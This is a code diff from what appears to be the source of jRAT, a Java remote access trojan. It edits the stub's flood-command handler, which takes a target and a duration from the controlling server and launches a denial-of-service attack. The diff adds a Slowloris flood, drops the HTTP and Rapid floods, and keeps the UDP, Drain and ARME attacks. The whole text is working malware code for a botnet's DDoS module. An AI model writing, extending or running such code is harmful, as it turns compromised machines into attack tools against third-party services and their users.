@@ -5,8 +5,7 @@ import su.jrat.stub.Connection;
 import su.jrat.stub.Constants;
 import su.jrat.stub.flood.ARME;
 import su.jrat.stub.flood.Drain;
-import su.jrat.stub.flood.HTTP;
-import su.jrat.stub.flood.Rapid;
+import su.jrat.stub.flood.Slowloris;
 import su.jrat.stub.flood.ThreadFlood;
 import su.jrat.stub.flood.UDP;
 
@@ -20,16 +19,10 @@ public class Packet22Flood extends AbstractIncomingPacket {
 		String target = Connection.readLine();
 		int seconds = Connection.readInt();
 
-		if (method == Flood.GET.getNumeric()) {
-			start(new HTTP(target, Constants.HTTP_GET), seconds);
-		} else if (method == Flood.POST.getNumeric()) {
-			start(new HTTP(target, Constants.HTTP_POST), seconds);
-		} else if (method == Flood.HEAD.getNumeric()) {
-			start(new HTTP(target, Constants.HTTP_HEAD), seconds);
-		} else if (method == Flood.UDP.getNumeric()) {
+		if (method == Flood.SLOWLORIS.getNumeric()) {
+			start(new Slowloris(target, Constants.HTTP_GET), seconds);
+		}  else if (method == Flood.UDP.getNumeric()) {
 			start(new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
-		} else if (method == Flood.RAPID.getNumeric()) {
-			start(new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
 		} else if (method == Flood.DRAIN.getNumeric()) {
 			start(new Drain(target), seconds);
 		} else if (method == Flood.ARME.getNumeric()) {
